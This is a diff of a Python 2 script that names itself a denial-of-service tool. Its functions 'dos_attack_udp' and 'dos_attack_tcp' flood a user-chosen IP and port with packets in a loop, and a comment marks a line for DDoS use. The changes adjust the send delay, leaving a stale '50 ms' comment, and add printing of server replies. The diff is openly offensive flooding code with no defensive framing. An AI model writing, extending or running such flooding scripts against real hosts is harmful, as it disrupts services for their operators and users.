@@ -15,7 +15,8 @@ import time
 """
 duration =random.uniform(0.05,0.1)  #50-100 ms. for DDos attack use this line.
 """
-duration = 0.05 #50 ms for Dos attack
+duration = 0.5 #50 ms for Dos attack
+buffer_size = 1024
 choice = raw_input(" UDP or TCP(U/T?):")
 
 def usage():
@@ -35,6 +36,8 @@ def dos_attack_udp(ip, port):
         udp_socket.sendto(data,(ip,port))
         cntr = cntr + 1
         print("send %s packet to %s throught port %s on a UDP connection."%(cntr, ip, port))
+        msg_from_server = udp_socket.recvfrom(buffer_size)
+        print("message from server:{}".format(msg_from_server))
 
 def dos_attack_tcp(ip, port):
     cntr = 0
@@ -49,6 +52,8 @@ def dos_attack_tcp(ip, port):
         tcp_socket.send(data)
         cntr = cntr + 1
         print("send %s packet to %s throught port %s on a TCP connection."%(cntr, ip, port))
+        msg_from_server = tcp_socket.recv(buffer_size)
+        print("message from server:{}".format(msg_from_server))
     tcp_socket.close()
 def main():
     if len(sys.argv) != 3:
